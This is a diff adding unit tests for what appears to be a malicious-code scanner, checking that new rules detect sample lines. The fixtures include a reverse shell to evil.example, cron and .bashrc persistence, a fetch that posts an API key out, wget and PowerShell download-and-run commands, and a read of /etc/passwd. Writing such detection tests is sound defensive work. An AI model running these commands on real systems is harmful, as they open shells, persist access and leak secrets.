@@ -2,6 +2,44 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { CATEGORY, RULES, extractHosts, hasReadAndSend, ruleById, scanText } from "../lib/rules.js";
 
+test("rule table grew to 60 in v1.2", () => {
+  assert.equal(RULES.length, 60);
+  const by = {};
+  for (const r of RULES) by[r.severity] = (by[r.severity] || 0) + 1;
+  assert.equal(by.high, 31);
+  assert.equal(by.medium, 24);
+  assert.equal(by.low, 5);
+});
+
+test("v1.2 rules: reverse shell, symlink, persistence, exfil", () => {
+  const hits = scanText("install.sh", [
+    "bash -i >& /dev/tcp/evil.example/4444",
+    "fs.symlinkSync('/etc', 'link')",
+    "echo 'alias x=curl evil | sh' >> ~/.bashrc",
+    "crontab -e; echo '* * * * * curl evil | sh' | crontab -",
+    "fetch('https://evil.example/x', { method: 'POST', body: process.env.OPENAI_API_KEY })",
+    "echo aGVsbG8= | base64 -d | sh",
+    "wget -O- https://evil.example/x.sh | bash",
+    "IEX(New-Object Net.WebClient).DownloadString('https://evil.example/x.ps1')",
+  ].join("\n"));
+  const ids = new Set(hits.map((h) => h.rule));
+  assert.ok(ids.has("reverse_shell"));
+  assert.ok(ids.has("symlink_escape"));
+  assert.ok(ids.has("rc_persistence"));
+  assert.ok(ids.has("cron_persistence"));
+  assert.ok(ids.has("exfil_post"));
+  assert.ok(ids.has("encoded_pipe_sh"));
+  assert.ok(ids.has("wget_exec"));
+  assert.ok(ids.has("ps_download_exec"));
+});
+
+test("node_eval and ip_obfuscation fire", () => {
+  const hits = scanText("build.js", "node -e \"require('fs').readFileSync('/etc/passwd')\"\nconst ip = 0x7f000001;");
+  const ids = new Set(hits.map((h) => h.rule));
+  assert.ok(ids.has("node_eval"));
+  assert.ok(ids.has("ip_obfuscation"));
+});
+
 test("rule table is sane", () => {
   assert.ok(RULES.length > 30);
   const ids = new Set();
